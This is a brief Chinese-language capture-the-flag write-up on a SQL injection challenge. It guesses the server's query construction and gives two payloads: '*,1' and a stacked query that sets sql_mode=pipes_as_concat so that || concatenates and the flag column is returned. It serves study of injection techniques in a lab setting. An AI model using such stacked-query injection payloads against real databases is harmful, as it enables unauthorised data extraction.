tags:: CTF/SQL

# 思路一

猜测网站SQL为：`“select”.post[‘query’]."||flag from Flag";`

所以只要让query为`*,1`即可让SQL为`select *,1||flag from Flag`，得到flag
# 思路二

输入的内容为：

`1;set sql_mode=pipes_as_concat;select 1`
- ## 解释
- 我们执行的语句分别为：
  ```sql
  select 1
  set sql_mode=pipes_as_concat
  select 1||flag from Flag
  ```
  其中set sql_mode=pipes_as_concat;的作用为将||的作用由or变为拼接字符串
  这个模式下进行查询的时候，使用字母连接会报错，使用数字连接才会查询出数据，因为这个 || 相当于是将 select 1 和 select flag from flag 的结果拼接在一起.
  读出flag